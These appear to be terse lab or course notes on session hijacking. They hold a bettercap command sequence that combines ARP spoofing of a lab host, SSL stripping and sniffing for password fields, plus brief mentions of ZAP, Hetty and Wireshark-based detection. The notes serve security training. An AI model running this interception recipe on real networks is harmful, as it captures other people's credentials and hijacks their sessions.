# Session Hijacking

## Perform session hijacking

- Hijack a session using Zed Attack Proxy (ZAP)
windows software

- Intercept HTTP traffic using bettercap
bettercap -iface eth0
net.probe on
net.recon on
set http.proxy.sslstrip true
set arp.spoof.internal true
set arp.spoof.targets 10.10.1.11
http.proxy on
arp.spoof on
net.sniff on
set net.sniff.regexp ‘.password=.+’

- Intercept HTTP traffic using Hetty
start console application
http://localhost:8080

## Detect session hijacking

- Detect session hijacking using Wireshark
bettercap produce a lot of ARP traffic
